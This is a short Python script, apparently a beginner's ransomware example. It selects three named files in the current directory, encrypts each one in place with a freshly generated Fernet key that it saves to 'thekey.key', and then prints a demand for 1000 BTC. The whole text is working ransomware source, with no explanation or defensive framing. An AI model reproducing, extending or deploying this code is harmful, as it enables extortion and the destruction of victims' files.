import os 
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file == "file.txt" or file == "hi.txt" or file == "moiz.txt":
        files.append(file)
print(files)

key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypt = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypt)
print("\nYour files are encrypted!!! send me 1000 BTC!!!\n")        